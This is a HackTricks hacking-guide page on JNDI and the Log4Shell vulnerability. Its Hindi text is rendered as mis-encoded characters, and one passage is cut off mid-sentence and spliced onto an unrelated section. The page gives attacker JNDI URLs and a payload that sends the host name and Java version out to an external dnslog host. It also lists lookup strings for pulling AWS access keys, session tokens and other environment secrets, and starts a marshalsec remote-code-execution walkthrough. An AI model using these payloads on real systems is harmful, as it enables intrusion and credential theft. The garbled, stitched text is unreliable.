# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><strong>рд╢реВрдиреНрдп рд╕реЗ рдирд╛рдпрдХ рддрдХ AWS рд╣реИрдХрд┐рдВрдЧ рд╕реАрдЦреЗрдВ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks рдХрд╛ рд╕рдорд░реНрдерди рдХрд░рдиреЗ рдХреЗ рдЕрдиреНрдп рддрд░реАрдХреЗ:

* рдпрджрд┐ рдЖрдк рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рдЖрдкрдХреА **рдХрдВрдкрдиреА рдХрд╛ рд╡рд┐рдЬреНрдЮрд╛рдкрди HackTricks рдореЗрдВ рджрд┐рдЦрд╛рдИ рджреЗ** рдпрд╛ **HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**, рддреЛ [**рд╕рдмреНрд╕рдХреНрд░рд┐рдкреНрд╢рди рдкреНрд▓рд╛рдиреНрд╕**](https://github.com/sponsors/carlospolop) рджреЗрдЦреЗрдВ!
* [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks рд╕реНрд╡реИрдЧ**](https://peass.creator-spring.com) рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) рдХреА рдЦреЛрдЬ рдХрд░реЗрдВ, рд╣рдорд╛рд░реЗ рд╡рд┐рд╢реЗрд╖ [**NFTs**](https://opensea.io/collection/the-peass-family) рдХрд╛ рд╕рдВрдЧреНрд░рд╣
* ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram group**](https://t.me/peass) рдореЗрдВ **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** рдпрд╛ **Twitter** рдкрд░ рдореБрдЭреЗ **рдлреЙрд▓реЛ** рдХрд░реЗрдВ ЁЯРж [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** рдХреЗ [**github repos**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) рдореЗрдВ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рдЕрдкрдиреА рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВред

</details>

<figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>

рдЕрдкрдиреА рддрдХрдиреАрдХреА рд╕реНрдЯреИрдХ рдореЗрдВ, APIs рд╕реЗ рд▓реЗрдХрд░ рд╡реЗрдм рдРрдкреНрд╕ рдФрд░ рдХреНрд▓рд╛рдЙрдб рд╕рд┐рд╕реНрдЯрдореНрд╕ рддрдХ, рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдХрдордЬреЛрд░рд┐рдпреЛрдВ рдХреЛ рдЦреЛрдЬреЗрдВ рддрд╛рдХрд┐ рдЖрдк рдЙрдиреНрд╣реЗрдВ рддреЗрдЬреА рд╕реЗ рдареАрдХ рдХрд░ рд╕рдХреЗрдВред рдЖрдЬ рд╣реА [**рдореБрдлреНрдд рдореЗрдВ рдЗрд╕реЗ рдЖрдЬрдорд╛рдПрдВ**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ред

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

***

## рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА

JNDI 1990 рдХреЗ рджрд╢рдХ рдХреЗ рдЕрдВрдд рд╕реЗ рдЬрд╛рд╡рд╛ рдореЗрдВ рдореМрдЬреВрдж рд╣реИред рдпрд╣ рдПрдХ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗрд╡рд╛ рд╣реИ рдЬреЛ **рдЬрд╛рд╡рд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдирд╛рдо рд╕реЗрд╡рд╛ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдбреЗрдЯрд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ**ред рдПрдХ рдирд╛рдо рд╕реЗрд╡рд╛ рдорд╛рдиреЛрдВ (рдмрд╛рдЗрдВрдбрд┐рдВрдЧреНрд╕) рдХреЛ рдЬреЛрдбрд╝рддреА рд╣реИ, рддрд╛рдХрд┐ рдЗрд╕реЗ рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рдореЗрдВ рдЗрд╕рдХреЗ рд╕рдВрджрд░реНрдн рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред

JNDI рдореЗрдВ рдХрдИ **рд╕реЗрд╡рд╛ рдкреНрд░рджрд╛рддрд╛ рдЗрдВрдЯрд░рдлреЗрд╕** (SPIs) рд╣реИрдВ рдЬреЛ рдЗрд╕реЗ рд╡рд┐рднрд┐рдиреНрди рдбрд╛рдпрд░реЗрдХреНрдЯрд░реА рд╕реЗрд╡рд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдмрдирд╛рддреЗ рд╣реИрдВред JNDI рдХрд╛ рдЙрджреНрджреЗрд╢реНрдп рдЕрдиреНрдп рд╕рд┐рд╕реНрдЯрдореЛрдВ рд╕реЗ рдмрд╣реБрдд рдЖрд╕рд╛рдиреА рд╕реЗ рдбреЗрдЯрд╛ рдкреНрд░рд╛рдкреНрдд рдХрд░рдирд╛ рд╣реИред рдЖрдк рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рднреА рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдпрд╣реАрдВ рдкрд░ рдПрдХ рд╕рдорд╕реНрдпрд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддреА рд╣реИред

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, SPIs **CORBA COS** (Common Object Service), **Java RMI** (Remote Method Interface) рд░рдЬрд┐рд╕реНрдЯреНрд░реА рдФрд░ **LDAP** рдХреЗ рд▓рд┐рдП рдореМрдЬреВрдж рд╣реИрдВред

![](<../../.gitbook/assets/image (627).png>)

### JNDI Naming Reference

рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдкреБрдирдГ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк рдЙрдиреНрд╣реЗрдВ рд╕реАрд░рд┐рдпрд▓рд╛рдЗрдЬрд╝ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдмрд╛рдЗрдирд░реА рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдХреЛ рд╕рд╣реЗрдЬ рд╕рдХрддреЗ рд╣реИрдВред рд▓реЗрдХрд┐рди рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░реЗрдЧрд╛ (рд╢рд╛рдпрдж рдХреНрдпреЛрдВрдХрд┐ рдбреЗрдЯрд╛ рдмрд╣реБрдд рдмрдбрд╝рд╛ рд╣реИ, рдпрд╛ рдХреЛрдИ рдЕрдиреНрдп рдЪреАрдЬ)ред\
рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдЕрдзрд┐рдХ рдЖрд╕рд╛рдиреА рд╕реЗ рд╕рд╣реЗрдЬрдиреЗ рдХреЗ рд▓рд┐рдП, **рдирд╛рдорд┐рдВрдЧ рд░реЗрдлрд░реЗрдВрд╕реЗрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред\
рдирд╛рдорд┐рдВрдЧ рд░реЗрдлрд░реЗрдВрд╕реЗрд╕ рдХреЗ 2 рдкреНрд░рдХрд╛рд░ рд╣реЛрддреЗ рд╣реИрдВ:

* **рд░реЗрдлрд░реЗрдВрд╕ рдПрдбреНрд░реЗрд╕реЗрд╕**: рдпрд╣ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЗ рдкрддреЗ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рддрд╛ рд╣реИ (_rmi://server/ref_), рдлрд┐рд░ **рдСрдмреНрдЬреЗрдХреНрдЯ рдЙрд╕ рдкрддреЗ рд╕реЗ рдкреНрд░рд╛рдкреНрдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред
* **рд░рд┐рдореЛрдЯ рдлреИрдХреНрдЯрд░реА**: рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдПрдХ **рд░рд┐рдореЛрдЯ рдлреИрдХреНрдЯрд░реА рдХреНрд▓рд╛рд╕** рдХреЛ JNDI рд░реЗрдлрд░реЗрдВрд╕ рдореЗрдВ рдЗрдВрдЧрд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛, рдлрд┐рд░, JNDI рдкрддреЗ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рддреЗ рд╣реБрдП рд░рд┐рдореЛрдЯ рдХреНрд▓рд╛рд╕ рдХреЛ рд░рд┐рдореЛрдЯ рдлреИрдХреНрдЯрд░реА рд╕реЗ рд▓рд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ **рдХреНрд▓рд╛рд╕ рдХреЛ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдФрд░ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдпрд╣ рдЦрддрд░рдирд╛рдХ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ **рд╣рдорд▓рд╛рд╡рд░ рд╕рд┐рд╕реНрдЯрдо рдХреЛ рдордирдорд╛рдиреЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рд▓реЛрдб рдХрд░рдиреЗ рдФрд░ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ**, рдЗрд╕рд▓рд┐рдП рдХреБрдЫ рд╕реБрд░рдХреНрд╖рд╛ рдЙрдкрд╛рдп рдореМрдЬреВрдж рд╣реИрдВ:

* **RMI**: `java.rmi.server.useCodeabseOnly = true` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **JDK 7u21** рд╕реЗ, рдЕрдиреНрдпрдерд╛ рдпрд╣ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдХрд╕реНрдЯрдо рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдЧрд╛ред рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдпрджрд┐ рд╕реБрд░рдХреНрд╖рд╛ рдЕрдХреНрд╖рдо рд╣реИ, рддреЛ рдПрдХ **рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдореИрдиреЗрдЬрд░** рдХреЛ рдпрд╣ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рд▓реЛрдб рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
* **LDAP**: `com.sun.jndi.ldap.object.trustURLCodebase = false` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **JDK** **6u141, 7u131, 8u121** рд╕реЗ, рдФрд░ рдпрд╣ рджреВрд░рд╕реНрде рд░реВрдк рд╕реЗ рдбрд╛рдЙрдирд▓реЛрдб рдХрд┐рдП рдЧрдП рдордирдорд╛рдиреЗ рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рджреЗрдЧрд╛ред рд▓реЗрдХрд┐рди рдЕрдЧрд░ рдпрд╣ `true` рдкрд░ рд╕реЗрдЯ рд╣реИ рддреЛ рдпрд╣ рдХрд░реЗрдЧрд╛ рдФрд░ **рдХреЛрдИ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдореИрдиреЗрдЬрд░ рд▓рд╛рдЧреВ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред
* **CORBA**: рдХреЛрдИ рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рд╣реИ рд▓реЗрдХрд┐рди **рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдореИрдиреЗрдЬрд░ рд╣рдореЗрд╢рд╛ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, **рдирд╛рдорд┐рдВрдЧ рдореИрдиреЗрдЬрд░**, рдЬреЛ JNDI рд▓рд┐рдВрдХреНрд╕ рдХрд╛ рдЕрдиреБрд╕рд░рдг рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рд╣реИ, рдХреЗ рдкрд╛рд╕ рдХреЛрдИ рд╕рд┐рдХреНрдпреЛрд░рд┐рдЯреА рдореИрдиреЗрдЬрд░ рдпрд╛ рдкреНрд░реЙрдкрд░реНрдЯреА рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдирд╣реАрдВ рд╣реИ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╣рдореЗрд╢рд╛ рдСрдмреНрдЬреЗрдХреНрдЯ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░реЗрдЧрд╛ред

рдЬреИрд╕рд╛ рдХрд┐ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ **рд╕рд╛рдорд╛рдиреНрдп рд╕реБрд░рдХреНрд╖рд╛ рдкрд░реНрдпрд╛рдкреНрдд рдирд╣реАрдВ рд╣реИрдВ** рдХреНрдпреЛрдВрдХрд┐ **рдордирдорд╛рдиреЗ рдкрддреЛрдВ рд╕реЗ JNDI рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рдЦрд┐рд▓рд╛рдл рдХреЛрдИ рд╕реБрд░рдХреНрд╖рд╛ рдирд╣реАрдВ рд╣реИ** рдФрд░ RMI, LDAP рдФрд░ CORBA рдХреА рд╕реБрд░рдХреНрд╖рд╛ рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди рдХреЗ рдЖрдзрд╛рд░ рдкрд░) **рдордирдорд╛рдиреЗ рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдпрд╛ **рдЬрд╛рд╡рд╛ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд▓реЛрдб рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЬреЛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдореЗрдВ рдореМрдЬреВрдж рдШрдЯрдХреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреЗ рдЬреИрд╕реЗ **рдЧреИрдЬреЗрдЯреНрд╕ рдордирдорд╛рдиреЗ рдХреЛрдб рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП**ред

JNDI рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП URL рдЙрджрд╛рд╣рд░рдг:

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### JNDI рдЙрджрд╛рд╣рд░рдг

![](<../../.gitbook/assets/image (655) (1) (1).png>)

рдпрджрд┐ рдЖрдкрдиреЗ рдПрдХ **`PROVIDER_URL`** рд╕реЗрдЯ рдХрд┐рдпрд╛ рд╣реИ, рддреЛ рдЖрдк рдПрдХ рдЕрд▓рдЧ рдПрдХ рдХреЛ рд▓реБрдХрдЕрдк рдореЗрдВ рдЗрдВрдЧрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЗрд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛: `ctx.lookup("<attacker-controlled-url>")` рдФрд░ рдпрд╣реА рд╡рд╣ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛ рддрд╛рдХрд┐ рд╡рд╣ рдПрдХ рд╕рд┐рд╕реНрдЯрдо рд╕реЗ рдордирдорд╛рдиреЗ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ рдХреЛ рд▓реЛрдб рдХрд░ рд╕рдХреЗ рдЬреЛ рдЙрд╕рдХреЗ рдирд┐рдпрдВрддреНрд░рдг рдореЗрдВ рд╣реИред

### CORBA

рдПрдХ **Interoperable Object Reference (IOR)** рдПрдХ CORBA рдпрд╛ RMI-IIOP рд╕рдВрджрд░реНрдн рд╣реИ рдЬреЛ рдПрдХ рджреВрд░рд╕реНрде CORBA рд╕рд░реНрд╡рд░ рдкрд░ рдПрдХ рдСрдмреНрдЬреЗрдХреНрдЯ рдХреЛ рдЕрджреНрд╡рд┐рддреАрдп рд░реВрдк рд╕реЗ рдкрд╣рдЪрд╛рдирддрд╛ рд╣реИред IORs рдмрд╛рдЗрдирд░реА рдкреНрд░рд╛рд░реВрдк рдореЗрдВ рдпрд╛ рдмрд╛рдЗрдирд░реА рдХреЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рд╣реЗрдХреНрд╕ рдкреНрд░рддрд┐рдирд┐рдзрд┐рддреНрд╡ рдореЗрдВ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВред\
рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рдмреАрдЪ, рдпрд╣ **Type ID** (рдПрдХ рдЗрдВрдЯрд░рдлреЗрд╕ рдХреЗ рд▓рд┐рдП рдПрдХ рдЕрджреНрд╡рд┐рддреАрдп рдкрд╣рдЪрд╛рдирдХрд░реНрддрд╛) рдФрд░ **Codebase** (рд╕реНрдЯрдм рдХреНрд▓рд╛рд╕ рдкреНрд░рд╛рдкреНрдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рджреВрд░рд╕реНрде рд╕реНрдерд╛рди) рдХреЛ рд╕рдорд╛рд╡реЗрд╢ рдХрд░рддрд╛ рд╣реИред\
рдиреЛрдЯ рдХрд░реЗрдВ рдХрд┐ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВ
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **рд╕рддреНрдпрд╛рдкрди**

рдХреБрдЫ рдкреНрд▓реЗрдЯрдлреЙрд░реНрдо рдЬреЛ рдкрд╣рд▓реЗ рд╕реВрдЪреАрдмрджреНрдз рдХрд┐рдП рдЧрдП рд╣реИрдВ, рдЖрдкрдХреЛ рдХреБрдЫ рдЪрд░ рдбреЗрдЯрд╛ рдбрд╛рд▓рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдВрдЧреЗ рдЬреЛ рд▓реЙрдЧ рд╣реЛ рдЬрд╛рдПрдЧрд╛ рдЬрдм рдЗрд╕реЗ рдЕрдиреБрд░реЛрдз рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред\
рдпрд╣ 2 рдЪреАрдЬреЛрдВ рдХреЗ рд▓рд┐рдП рдмрд╣реБрдд рдЙрдкрдпреЛрдЧреА рд╣реЛ рд╕рдХрддрд╛ рд╣реИ:

* рднреЗрджреНрдпрддрд╛ рдХреЛ **рд╕рддреНрдпрд╛рдкрд┐рдд** рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП
* рднреЗрджреНрдпрддрд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЬрд╛рдирдХрд╛рд░реА рдХреЛ **рдирд┐рдХрд╛рд▓рдиреЗ** рдХреЗ рд▓рд┐рдП

рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП рдЖрдк рдХреБрдЫ рдРрд╕рд╛ рдЕрдиреБрд░реЛрдз рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:\
рдпрд╛ `${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** рдФрд░ рдЕрдЧрд░ **DNS рдЕрдиреБрд░реЛрдз рдЪрд░ рдХреЗ рдореВрд▓реНрдп рдХреЗ рд╕рд╛рде рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ**, рддреЛ рдЖрдк рдЬрд╛рдирддреЗ рд╣реИрдВ рдХрд┐ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рднреЗрджреНрдп рд╣реИред

рдЕрдиреНрдп рдЬрд╛рдирдХрд╛рд░реА рдЬрд┐рд╕реЗ рдЖрдк **рдирд┐рдХрд╛рд▓рдиреЗ** рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE рдЬрд╛рдирдХрд╛рд░реА

{% hint style="info" %}
**JDKs рдХреЗ рд╕рдВрд╕реНрдХрд░рдг 6u141, 7u131, 8u121 рд╕реЗ рдЕрдзрд┐рдХ рдЪрд▓ рд░рд╣реЗ рд╣реЛрд╕реНрдЯ LDAP рдХреНрд▓рд╛рд╕ рд▓реЛрдбрд┐рдВрдЧ** рд╡реЗрдХреНрдЯрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реЛрдВрдЧреЗ **рд▓реЗрдХрд┐рди рдбрд┐рд╕реЗрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рд╡реЗрдХреНрдЯрд░ рдХреЗ рдЦрд┐рд▓рд╛рдл рдирд╣реАрдВ**ред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рд╣реИ рдХрд┐ `com.sun.jndi.ldap.object.trustURLCodebase` рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдЕрдХреНрд╖рдо рд╣реИ, рдЗрд╕рд▓рд┐рдП JNDI LDAP рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд░рд┐рдореЛрдЯ рдХреЛрдбрдмреЗрд╕ рд▓реЛрдб рдирд╣реАрдВ рдХрд░ рд╕рдХрддрд╛ред рд▓реЗрдХрд┐рди рд╣рдореЗрдВ рдбрд┐рд╕реЗрд░рд┐рдпрд▓рд╛рдЗрдЬреЗрд╢рди рдФрд░ рд╡реЗрд░рд┐рдПрдмрд▓ рд▓реАрдХреНрд╕ рд╕рдВрднрд╡ рд╣реЛрдиреЗ рдкрд░ рдЬреЛрд░ рджреЗрдирд╛ рдЪрд╛рд╣рд┐рдПред\
рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ **рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП** рдЖрдкрдХреЛ **рдХреБрдЫ рд╡рд┐рд╢реНрд╡рд╕рдиреАрдп рдЧреИрдЬреЗрдЯ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛** рдЬреЛ рдЬрд╛рд╡рд╛ рдПрдкреНрд▓рд┐рдХреЗрд╢рди рдкрд░ рдореМрдЬреВрдж рд╣реИ (рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП ysoserial рдпрд╛ JNDIExploit рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ)ред рд▓реЗрдХрд┐рди рдирд┐рдЪрд▓реЗ рд╕рдВрд╕реНрдХрд░рдгреЛрдВ рдХрд╛ рд╢реЛрд╖рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП, рдЖрдк рдЙрдиреНрд╣реЗрдВ рдордирдорд╛рдиреА рдХреНрд▓рд╛рд╕реЗрд╕ рд▓реЛрдб рдФрд░ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ (рдЬреЛ рд╣рдорд▓реЗ рдХреЛ рдЖрд╕рд╛рди рдмрдирд╛рддрд╛ рд╣реИ)ред

**рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП** (_RMI рдФрд░ CORBA рд╡реЗрдХреНрдЯрд░реНрд╕ рдкрд░ рд╕реАрдорд╛рдУрдВ рдХреА рддрд░рд╣_) **рдкрд┐рдЫрд▓реЗ JNDI Naming Reference рдЕрдиреБрднрд╛рдЧ рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ** рдпрд╛ [https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)
{% endhint %}

### RCE - Marshalsec рдХреЗ рд╕рд╛рде рдХрд╕реНрдЯрдо рдкреЗрд▓реЛрдб

_рдпрд╣ рдЯреНрд░рд┐рдХ рдкреВрд░реА рддрд░рд╣ рд╕реЗ **THM рдмреЙрдХреНрд╕ рд╕реЗ рд▓реА рдЧрдИ рд╣реИ:**_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)___

рдЗрд╕ рд╢реЛрд╖рдг рдХреЗ рд▓рд┐рдП рдЙрдкрдХрд░рдг [**marshalsec**](https://github.com/mbechler/marshalsec) (рдпрд╣рд╛рдБ рд╕реЗ [**jar рд╕рдВрд╕реНрдХрд░рдг рдбрд╛рдЙрдирд▓реЛрдб рдХрд░реЗрдВ**](https://github.com/RandomRobbieBF/marshalsec-jar)) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рдПрдХ LDAP рд░реЗрдлрд░рд▓ рд╕рд░реНрд╡рд░ рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЬреЛ рдХрдиреЗрдХреНрд╢рди рдХреЛ рд╣рдорд╛рд░реЗ рджреНрд╡рд┐рддреАрдпрдХ HTTP рд╕рд░реНрд╡рд░ рдХреА рдУрд░ рдирд┐рд░реНрджреЗрд╢рд┐рдд рдХрд░реЗрдЧрд╛ рдЬрд╣рд╛рдБ рд╢реЛрд╖рдг 